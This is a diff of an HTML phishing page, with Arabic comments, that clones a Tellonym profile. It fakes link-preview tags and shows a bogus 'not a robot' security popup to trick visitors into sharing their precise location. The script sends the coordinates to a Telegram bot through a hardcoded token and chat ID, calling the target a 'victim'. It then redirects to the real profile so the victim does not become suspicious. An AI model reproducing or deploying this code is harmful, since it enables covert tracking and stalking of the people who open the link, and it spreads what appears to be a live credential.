@@ -1,50 +1,141 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <!-- التمويه: هذه الأسطر تجعل الرابط يظهر بشكل رسمي عند إرساله في واتساب أو تليجرام -->
-    <meta property="og:title" content="Schaien on Tellonym">
-    <meta property="og:description" content="Ask me anything anonymously!">
-    <meta property="og:image" content="https://tellonym.me/static/img/logo.png">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tellonym - Schaien</title>
+    <!-- التمويه في المعاينة -->
+    <meta property="og:title" content="Schaien (@Schaien) | Tellonym">
+    <meta property="og:description" content="إسألني أي شيء بهوية مجهولة!">
+    <meta property="og:image" content="https://tellonym.me/static/img/logo.png">
+    <title>Schaien (@Schaien) | Tellonym</title>
     
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000000;
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .header {
+            width: 100%;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 1px solid #333;
+        }
+        .profile-container {
+            margin-top: 40px;
+            text-align: center;
+            width: 90%;
+        }
+        .avatar {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #ff0055, #ff5500);
+            margin-bottom: 15px;
+            display: inline-block;
+        }
+        .username {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .handle {
+            color: #888;
+            margin-bottom: 20px;
+        }
+        .input-box {
+            width: 100%;
+            height: 120px;
+            background-color: #1a1a1a;
+            border-radius: 15px;
+            border: 1px solid #333;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #555;
+        }
+        .btn {
+            background-color: #ff0055;
+            color: white;
+            padding: 12px 40px;
+            border-radius: 25px;
+            font-weight: bold;
+            margin-top: 20px;
+            border: none;
+        }
+        /* نافذة وهمية لإجبار المستخدم على الموافقة */
+        #verify-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #222;
+            padding: 25px;
+            border-radius: 20px;
+            width: 80%;
+            max-width: 300px;
+            text-align: center;
+            z-index: 1000;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+    </script>
+</head>
+<body>
+
+    <div class="header">
+        <img src="https://tellonym.me/static/img/logo.png" style="height: 30px;">
+    </div>
+
+    <div class="profile-container">
+        <div class="avatar"></div> <!-- يمكنك وضع صورتك هنا -->
+        <div class="username">Schaien</div>
+        <div class="handle">@Schaien</div>
+        
+        <div class="input-box">
+            أرسل لي تيل صادق...
+        </div>
+        <button class="btn">إرسال</button>
+    </div>
+
+    <!-- نافذة طلب الإذن "التمويهية" -->
+    <div id="verify-popup">
+        <h3 style="margin-top:0">تحقق الأمان</h3>
+        <p style="font-size: 14px; color: #ccc;">لعرض الملف الشخصي لـ Schaien، يجب السماح بالوصول للموقع للتأكد من أنك لست روبوت.</p>
+        <button onclick="startCatch()" style="background:#fff; color:#000; border:none; padding:10px 20px; border-radius:10px; font-weight:bold;">موافق</button>
+    </div>
+
     <script>
         const token = "8571405650:AAF1hd5JADnu7a2fdqxLA1E_fUrk45Orbp4";
         const chatId = "1138822664";
-        const targetProfile = "https://tellonym.me/Schaien"; // توجيه مباشر لحسابك
 
-        function sendToMaster(pos) {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const accuracy = pos.coords.accuracy;
-            const msg = `🎯 تم صيد الضحية بنجاح!\n👤 الحساب المستهدف: Schaien\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n📏 الدقة: ${accuracy} متر`;
+        function startCatch() {
+            document.getElementById('verify-popup').style.display = 'none';
             
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
-            .finally(() => {
-                // تحويل الضحية فوراً إلى حسابك Schaien
-                window.location.href = targetProfile;
-            });
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const msg = `🎯 الضحية وقع في الفخ المستنسخ!\n📍 الإحداثيات: https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
+                    .finally(() => {
+                        window.location.href = "https://tellonym.me/Schaien";
+                    });
+                },
+                (err) => {
+                    window.location.href = "https://tellonym.me/Schaien";
+                },
+                {enableHighAccuracy: true}
+            );
         }
-
-        function handleFail() {
-            // حتى لو فشل أو رفض، يذهب لصفحتك لكي لا يشك
-            window.location.href = targetProfile;
-        }
-
-        window.onload = function() {
-            // طلب الموقع بهدوء فور تحميل الصفحة
-            navigator.geolocation.getCurrentPosition(sendToMaster, handleFail, {
-                enableHighAccuracy: true,
-                timeout: 5000
-            });
-        };
     </script>
-</head>
-<body style="background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif;">
-    <div style="text-align: center;">
-        <img src="https://tellonym.me/static/img/logo.png" style="width: 80px; margin-bottom: 20px;">
-        <p>جاري تحميل الصفحة...</p>
-    </div>
 </body>
 </html>
